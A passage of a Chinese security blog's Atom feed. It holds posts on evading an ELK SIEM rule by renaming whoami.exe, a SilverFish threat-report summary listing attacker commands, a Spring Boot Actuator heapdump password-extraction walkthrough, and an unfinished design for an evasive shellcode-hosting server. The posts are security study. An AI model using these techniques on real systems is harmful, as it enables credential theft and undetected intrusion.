process.pe.original_file_name:&quot;wmic.exe&quot;) and    process.args:&quot;&#x2F;namespace:\\\\root\\SecurityCenter2&quot; and process.args:&quot;Get&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><p>规则名称：Net command via SYSTEM account<br>规则介绍：以SYSTEM权限执行net.exe</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and  user.id in (&quot;S-1-5-18&quot;, &quot;S-1-5-19&quot;, &quot;S-1-5-20&quot;) and  process.name : &quot;whoami.exe&quot; or  (process.name : &quot;net1.exe&quot; and not process.parent.name : &quot;net.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/SigmaHQ/sigma">sigma</a>(Generic Signature Format for SIEM Systems)，这种描述方式特别像病毒软件的特征码。</p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><ul><li>绕过的方式应该还有很多，未测试</li><li>安骑士的原理类似，比如碰到过阿里云上执行<code>whoami、systeminfo</code>就告警</li><li>看完<a href="http://weizn.net/?p=439">通过SYSMON日志检测Cobalt Strike木马</a>我觉得这个才是SIEM的解决方式</li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://unicornsec.com/home/siem-home-lab-series-part-1">SIEM实验系列-1</a></li><li><a href="https://unicornsec.com/home/siem-home-lab-series-part-2">SIEM实验系列-2</a></li><li><a href="https://unicornsec.com/home/siem-home-lab-series-part-3">SIEM实验系列-3</a></li><li><a href="http://weizn.net/?p=439">通过SYSMON日志检测Cobalt Strike木马</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;p&gt;参考链接里有详细的安装步骤，测试客户端是Windows，安装了如下软件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sysmon.exe(&lt;a href=&quot;https://github.com/SwiftOnSecurity/sysmon-config&quot;&gt;配置文件&lt;/a&gt;)&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.\sysmon64.exe -accepteula -i c:\windows\config.xml&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;winlogbeat.exe&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.\install-service-winlogbeat.ps1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.\winlogbeat.exe setup -e&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ElasticAgent.exe&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.\elastic-agent.exe install  --insecure -f --fleet-server-es=&amp;lt;ES&amp;gt; --fleet-server-service-token=&amp;lt;token&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;规则监测和绕过&quot;&gt;&lt;a href=&quot;#规则监测和绕过&quot; class=&quot;headerlink&quot; title=&quot;规则监测和绕过&quot;&gt;&lt;/a&gt;规则监测和绕过&lt;/h3&gt;&lt;p&gt;规则有5种查询，一般使用EQL(Event Query Language)查询类型:&lt;br&gt;&lt;img src=&quot;/2021/08/02/siem-on-elk/siem-1.png&quot;&gt;&lt;br&gt;SIEM有内置很多规则，默认是关闭状态，这些规则都是ATT&amp;amp;CK框架攻击行为转化而来的，例如windows下的&lt;code&gt;whoami&lt;/code&gt;查询规则(&lt;del&gt;正经人谁查whoami啊&lt;/del&gt;):&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;process where event.type in (&amp;quot;start&amp;quot;, &amp;quot;process_started&amp;quot;) and process.name : &amp;quot;whoami.exe&amp;quot;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们拿这条规则做分析，这条规则匹配了当进程开始的时候，进程名为&lt;code&gt;whoami.exe&lt;/code&gt;的时候触发，所以我们把&lt;code&gt;whoami.exe&lt;/code&gt;复制一下，就可以绕过去了:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;copy C:\Windows\System32\whoami.exe C:\Windows\temp\x.exe
C:\Windows\temp\x.exe&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;是不是把siem想的简单了，这跟通过复制&lt;code&gt;net.exe&lt;/code&gt;绕过添加用户一模一样，仔细观察下elk里面的字段，可以发现&lt;code&gt;process.pe.original_file_name&lt;/code&gt;仍然保留了&lt;code&gt;whoami.exe&lt;/code&gt;，这是PE文件里面固定的，所以我们手动把预警规则修改一下:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;process where event.type in (&amp;quot;start&amp;quot;, &amp;quot;process_started&amp;quot;) and process.pe.original_file_name: &amp;quot;whoami.exe&amp;quot;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Silver调查报告</title>
    <link href="https://jkme.github.io/2021/07/29/silverFish.html"/>
    <id>https://jkme.github.io/2021/07/29/silverFish.html</id>
    <published>2021-07-28T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.950Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://www.prodaft.com/m/reports/SilverFish_TLPWHITE_v2.pdf">SilverFish_TLPWHITE</a></p></blockquote><h1 id="起点"><a href="#起点" class="headerlink" title="起点"></a>起点</h1><p>根据FireEye发布的IOC，有一个域名是databasegalore.com，这个域名下的IP在2304端口起了PowerMTA服务，web目录扫描之后发现example.php。PTI团队根据这两个网页的设备指纹和PowerMTA服务，扫描了全网的IPv4地址，发现一个IP地址: <code>81.4.122.203</code>，然后PTI团队对IP下的C段进行渗透测试，发现<code>81.4.122.101</code>存在一个C2服务器。</p><h3 id="C2分析"><a href="#C2分析" class="headerlink" title="C2分析"></a>C2分析</h3><p><img src="/2021/07/29/silverFish/silver_C2.png"></p><p>收集信息如下：</p><ul><li>ID</li><li>UUID</li><li>Instance</li><li>IP</li><li>Country</li><li>Domain\User@Computer</li><li>OS</li><li>Build</li><li>Architecture</li><li>Antivirus</li><li>Is Admin</li><li>Integrity Level</li><li>UAC Setting</li><li>ConsentPromptBehaviorAdmin • PromptOnSecureDesktop</li><li>First visit</li></ul><p>每个受害者页面都可以发送攻击指令，有如下：<br><img src="/2021/07/29/silverFish/silver_command.png"></p><p>看了下是命令执行和UAC绕过比较多，C2服务器的防护措施有如下：</p><ul><li>使用AppArmor隔离环境</li><li>关闭访问日志（web日志、SSH登录日志、命令行日志）</li><li>使用IPTABLES只允许白名单IP访问</li></ul><p><img src="/2021/07/29/silverFish/silver_ip.png"></p><h3 id="TDS-Traffic-Distrbution-System-系统分析"><a href="#TDS-Traffic-Distrbution-System-系统分析" class="headerlink" title="TDS(Traffic Distrbution System)系统分析"></a>TDS(Traffic Distrbution System)系统分析</h3><p>  是一个类似负载均衡的系统，可以把受害者的流量定向到不同的C2服务器，因为受害者大概有4千多个，同时这个系统可以根据国家来分组，并且类似JIRA的系统，指定受害者给不同的黑客。<br>  <img src="/2021/07/29/silverFish/tds.png"></p><p> 流量分发系统的一部分是由可信网站组成的，这种网站被黑了之后，加入php和js代码，判断每个请求是否符合一定的特征，符合特征之后会向特定网站发送一个GET请求。</p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><ul><li>常用命令<ul><li>nltest /dclist  列域控</li><li>nltest /domain_trusts</li><li>cmdkey /list  列已存储的密码</li><li>net group “domain admins” /domain  查看域控管理员</li><li>powershell -nop -enc xxx  执行命令</li></ul></li></ul><p><img src="/2021/07/29/silverFish/silver_post.png"></p><p>使用的其中一个横向工具是Koadic，一般通过mshta运行混淆之后的脚本：<br><img src="/2021/07/29/silverFish/silver_koadic.png"></p><h4 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h4><p>cobaltstrike使用了域前置的技术，比如<code>twimg-us.azureedge.net</code>, <code>d3ser9acyt7cdp.cloudfront.net</code>，其中一个上线的方式是使用msbuild：<code>C:\Windows\Microsoft.Net\Framework64\v4.0.30319\msbuild.exe C:\ms654.csproj</code><br><img src="/2021/07/29/silverFish/silver_cdn.png"></p><h3 id="VictimTotal-Sandbox"><a href="#VictimTotal-Sandbox" class="headerlink" title="VictimTotal Sandbox"></a>VictimTotal Sandbox</h3><p>研究人员发现的最震惊的Web平台，SilverFish使用受害者作为杀软测试云端平台，控制了超过6000个设备主机，不定期测试木马脚本的免杀性。</p><p><img src="/2021/07/29/silverFish/silver_sandbox.png"></p><p>Powershell脚本的编码是这样的: 使用6字节的key做一次xor–&gt;base64编码–&gt;AES加密–&gt;混淆。</p><h3 id="NetSupportManager"><a href="#NetSupportManager" class="headerlink" title="NetSupportManager"></a>NetSupportManager</h3><p>把NetSupportManager程序里面的client32.exe重命名为ctfmon.exe，然后设置持久化后门：<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run </code></p><h3 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h3><ul><li>高度的组织化，具有代表性的TDS系统</li><li>C2界面很简洁</li><li>云沙盒的概念真厉害</li><li>很好奇怎么日进去的，域前置的域名为啥是Oracle的？</li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.prodaft.com/m/reports/SilverFish_TLPWHITE_v2.pdf&quot;&gt;SilverFish_TLPWHITE&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;起点&quot;&gt;&lt;a href=&quot;#起点&quot; class=&quot;headerlink&quot; title=&quot;起点&quot;&gt;&lt;/a&gt;起点&lt;/h1&gt;&lt;p&gt;根据FireEye发布的IOC，有一个域名是databasegalore.com，这个域名下的IP在2304端口起了PowerMTA服务，web目录扫描之后发现example.php。PTI团队根据这两个网页的设备指纹和PowerMTA服务，扫描了全网的IPv4地址，发现一个IP地址: &lt;code&gt;81.4.122.203&lt;/code&gt;，然后PTI团队对IP下的C段进行渗透测试，发现&lt;code&gt;81.4.122.101&lt;/code&gt;存在一个C2服务器。&lt;/p&gt;
&lt;h3 id=&quot;C2分析&quot;&gt;&lt;a href=&quot;#C2分析&quot; class=&quot;headerlink&quot; title=&quot;C2分析&quot;&gt;&lt;/a&gt;C2分析&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/2021/07/29/silverFish/silver_C2.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;收集信息如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ID&lt;/li&gt;
&lt;li&gt;UUID&lt;/li&gt;
&lt;li&gt;Instance&lt;/li&gt;
&lt;li&gt;IP&lt;/li&gt;
&lt;li&gt;Country&lt;/li&gt;
&lt;li&gt;Domain\User@Computer&lt;/li&gt;
&lt;li&gt;OS&lt;/li&gt;
&lt;li&gt;Build&lt;/li&gt;
&lt;li&gt;Architecture&lt;/li&gt;
&lt;li&gt;Antivirus&lt;/li&gt;
&lt;li&gt;Is Admin&lt;/li&gt;
&lt;li&gt;Integrity Level&lt;/li&gt;
&lt;li&gt;UAC Setting&lt;/li&gt;
&lt;li&gt;ConsentPromptBehaviorAdmin • PromptOnSecureDesktop&lt;/li&gt;
&lt;li&gt;First visit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;每个受害者页面都可以发送攻击指令，有如下：&lt;br&gt;&lt;img src=&quot;/2021/07/29/silverFish/silver_command.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;看了下是命令执行和UAC绕过比较多，C2服务器的防护措施有如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用AppArmor隔离环境&lt;/li&gt;
&lt;li&gt;关闭访问日志（web日志、SSH登录日志、命令行日志）&lt;/li&gt;
&lt;li&gt;使用IPTABLES只允许白名单IP访问&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Spring Boot Actuator漏洞复现</title>
    <link href="https://jkme.github.io/2021/05/27/spring-boot-actuator.html"/>
    <id>https://jkme.github.io/2021/05/27/spring-boot-actuator.html</id>
    <published>2021-05-26T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.952Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01. 基本知识"></a>0x01. 基本知识</h3><ol><li>在pom.xml里面有这样的配置</li></ol><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;   &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;   &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;   &lt;exclusions&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>没有开启安全设置</li></ol><pre class="line-numbers language-none"><code class="language-none">management:  security:    enabled: false  health:    elasticsearch:      enabled: false  metrics:    export:      prometheus:        enabled: true      jmx:        enabled: true  endpoints:    web:      exposure:        include: &#39;*&#39;      base-path: &#x2F;auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务端可以通过修改配置文件来改变Actuator的根路径：<code>management.endpoints.web.base-path=/monitor</code></p><p>  搜索github的源代码，可以看到类似的设置：</p><h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>在配置不当的时候，可能暴露以下路由:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator&#x2F;auditevents&#x2F;autoconfig&#x2F;beans&#x2F;caches&#x2F;conditions&#x2F;configprops&#x2F;docs&#x2F;dump&#x2F;env&#x2F;flyway&#x2F;health&#x2F;heapdump&#x2F;httptrace&#x2F;info&#x2F;intergrationgraph&#x2F;jolokia&#x2F;logfile&#x2F;loggers&#x2F;liquibase&#x2F;metrics&#x2F;mappings&#x2F;prometheus&#x2F;refresh&#x2F;scheduledtasks&#x2F;sessions&#x2F;shutdown&#x2F;trace&#x2F;threaddump&#x2F;actuator&#x2F;auditevents&#x2F;actuator&#x2F;beans&#x2F;actuator&#x2F;health&#x2F;actuator&#x2F;conditions&#x2F;actuator&#x2F;configprops&#x2F;actuator&#x2F;env&#x2F;actuator&#x2F;info&#x2F;actuator&#x2F;loggers&#x2F;actuator&#x2F;heapdump&#x2F;actuator&#x2F;threaddump&#x2F;actuator&#x2F;metrics&#x2F;actuator&#x2F;scheduledtasks&#x2F;actuator&#x2F;httptrace&#x2F;actuator&#x2F;mappings&#x2F;actuator&#x2F;jolokia&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过<code>/heapdump</code>这个节点获取内存，然后使用<a href="https://www.eclipse.org/mat/downloads.php">Memory Analyzer</a>分析内存，获取敏感信息，常用查询：</p><pre class="line-numbers language-none"><code class="language-none">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))或select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))  select* from java.util.Hashtable$Entry x WHERE(toString(x.key).contains(&quot;username&quot;))select* from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))select* from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;url&quot;))select* from java.lang.String s WHERE toString(s) LIKE &quot;.*password.*&quot;select* from org.springframework.web.context.support.StandardServletEnvironmentselect* from java.lang.String s WHERE toString(s) LIKE &quot;.*SESSION.*&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ul><li>参考链接里面，当下载/heapdump是403的时候, <code>/heapdump.json</code>可以下载成功，这个在spring启动的时候可以看到路由，所有的节点信息都存在<code>.json</code>路径</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.com/LandGrey/SpringBootVulExploit">SpringBootVulExploit</a></li><li><a href="https://mp.weixin.qq.com/s/sJAyhQQvGqG-SliSGbhJNA">渗透大型菠菜网站鸭脖</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-基本知识&quot;&gt;&lt;a href=&quot;#0x01-基本知识&quot; class=&quot;headerlink&quot; title=&quot;0x01. 基本知识&quot;&gt;&lt;/a&gt;0x01. 基本知识&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;在pom.xml里面有这样的配置&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;
&amp;lt;dependency&amp;gt;
   &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;&amp;#x2F;groupId&amp;gt;
   &amp;lt;artifactId&amp;gt;spring-boot-starter-actuator&amp;lt;&amp;#x2F;artifactId&amp;gt;
   &amp;lt;exclusions&amp;gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;没有开启安全设置&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;management:
  security:
    enabled: false
  health:
    elasticsearch:
      enabled: false
  metrics:
    export:
      prometheus:
        enabled: true
      jmx:
        enabled: true
  endpoints:
    web:
      exposure:
        include: &amp;#39;*&amp;#39;
      base-path: &amp;#x2F;auto&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;服务端可以通过修改配置文件来改变Actuator的根路径：&lt;code&gt;management.endpoints.web.base-path=/monitor&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;  搜索github的源代码，可以看到类似的设置：&lt;/p&gt;
&lt;h3 id=&quot;0x02-漏洞利用&quot;&gt;&lt;a href=&quot;#0x02-漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;0x02 漏洞利用&quot;&gt;&lt;/a&gt;0x02 漏洞利用&lt;/h3&gt;&lt;p&gt;在配置不当的时候，可能暴露以下路由:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;&amp;#x2F;actuator
&amp;#x2F;auditevents
&amp;#x2F;autoconfig
&amp;#x2F;beans
&amp;#x2F;caches
&amp;#x2F;conditions
&amp;#x2F;configprops
&amp;#x2F;docs
&amp;#x2F;dump
&amp;#x2F;env
&amp;#x2F;flyway
&amp;#x2F;health
&amp;#x2F;heapdump
&amp;#x2F;httptrace
&amp;#x2F;info
&amp;#x2F;intergrationgraph
&amp;#x2F;jolokia
&amp;#x2F;logfile
&amp;#x2F;loggers
&amp;#x2F;liquibase
&amp;#x2F;metrics
&amp;#x2F;mappings
&amp;#x2F;prometheus
&amp;#x2F;refresh
&amp;#x2F;scheduledtasks
&amp;#x2F;sessions
&amp;#x2F;shutdown
&amp;#x2F;trace
&amp;#x2F;threaddump
&amp;#x2F;actuator&amp;#x2F;auditevents
&amp;#x2F;actuator&amp;#x2F;beans
&amp;#x2F;actuator&amp;#x2F;health
&amp;#x2F;actuator&amp;#x2F;conditions
&amp;#x2F;actuator&amp;#x2F;configprops
&amp;#x2F;actuator&amp;#x2F;env
&amp;#x2F;actuator&amp;#x2F;info
&amp;#x2F;actuator&amp;#x2F;loggers
&amp;#x2F;actuator&amp;#x2F;heapdump
&amp;#x2F;actuator&amp;#x2F;threaddump
&amp;#x2F;actuator&amp;#x2F;metrics
&amp;#x2F;actuator&amp;#x2F;scheduledtasks
&amp;#x2F;actuator&amp;#x2F;httptrace
&amp;#x2F;actuator&amp;#x2F;mappings
&amp;#x2F;actuator&amp;#x2F;jolokia
&amp;#x2F;actuator&amp;#x2F;hystrix.stream&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>防御性C2玩具尝试</title>
    <link href="https://jkme.github.io/2021/04/06/defense-from-c2.html"/>
    <id>https://jkme.github.io/2021/04/06/defense-from-c2.html</id>
    <published>2021-04-05T16:00:00.000Z</published>
    <updated>2022-01-21T02:45:42.671Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景需求"><a href="#背景需求" class="headerlink" title="背景需求"></a>背景需求</h3><p>不管一个什么形式的后门：定时任务、dll劫持、开机启动…，当我设置的后门运行的时候，我想掌握后门的启动时间、触发IP等上环境，所以这篇文章是在shellcode分离免杀的基础上做了尝试性扩展</p><h4 id="考虑这样的场景："><a href="#考虑这样的场景：" class="headerlink" title="考虑这样的场景："></a>考虑这样的场景：</h4><ul><li>后门被静态分析</li><li>后门被动态分析</li><li>shellcode被提取之后触发</li><li>…</li></ul><p>在shellcode分离免杀的基础上扩展还是比较容易的，当客户端请求远程shellcode托管服务器的时候，增加一个机器人，然后发起一个上线通知：If This Then That，这样太简单了，我们再多加点料，比如：</p><ol><li>不带合理参数请求shellcode的URL时候，发起警告</li><li>当木马运行在恶意环境的时候，发起警告<ul><li>当木马上线IP不在服务端列表</li><li>当木马上线主机的设备指纹不在服务端列表</li></ul></li><li>shellcode托管服务随时可以关闭打开</li><li>shellcode托管服务随时可以新增删除木马上线IP或者设备指纹</li></ol><h3 id="准备材料"><a href="#准备材料" class="headerlink" title="准备材料"></a>准备材料</h3><ul><li>一台VPS：托管shellcode，通知slack机器人</li><li>一个AWS账号隐藏C2（CloudFront）</li><li>Slack：接收通知，使用<code>Slash commands</code>功能控制shellcode托管服务</li></ul><h5 id="托管shellcode流程"><a href="#托管shellcode流程" class="headerlink" title="托管shellcode流程"></a>托管shellcode流程</h5><p><img src="/2021/04/06/defense-from-c2/18.png"></p><h5 id="Slack通知"><a href="#Slack通知" class="headerlink" title="Slack通知"></a>Slack通知</h5><p><img src="/2021/04/06/defense-from-c2/slack.png"></p><h5 id="Slash-Command"><a href="#Slash-Command" class="headerlink" title="Slash Command"></a>Slash Command</h5><p><img src="/2021/04/06/defense-from-c2/9.png"></p><p>这个点是从TG上社工库跑路得来的思路，当执行任何一个命令的时候，都会发起一个请求到VPS，然后VPS处理请求。<br>在slack里面增加<code>slach commands</code>:</p><ul><li><code>/boot</code> 开启shellcode托管服务</li><li><code>/delete</code> 删除IP白名单，<code>/delete ip 127.0.0.1</code> </li><li><code>/info</code> 获取托管shellcode服务器的状态</li><li><code>/add</code> 增加IP白名单，<code>/add ip 127.0.0.1</code></li><li><code>/shutdown</code> 关闭shellcode托管服务器</li></ul><p>大概流程是这样，IP白名单直接使用redis来存储，可以设置一个IP为<code>*</code>的时候，任何IP都能上线。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/curd'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@verify_check</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    command <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"command"</span><span class="token punctuation">]</span>    text <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span>    l <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>get_switch<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The Command is &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The Text is &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"db status &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>get_agent_status<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> command <span class="token operator">==</span> <span class="token string">"/add"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> l<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"ip"</span><span class="token punctuation">:</span>            redis<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">"ip_&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            msg <span class="token operator">=</span> set_msg<span class="token punctuation">(</span><span class="token string">"增加 &#123;&#125;成功, 状态: &#123;&#125;\n当前数据库: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">[</span><span class="token number">1</span><span class="token 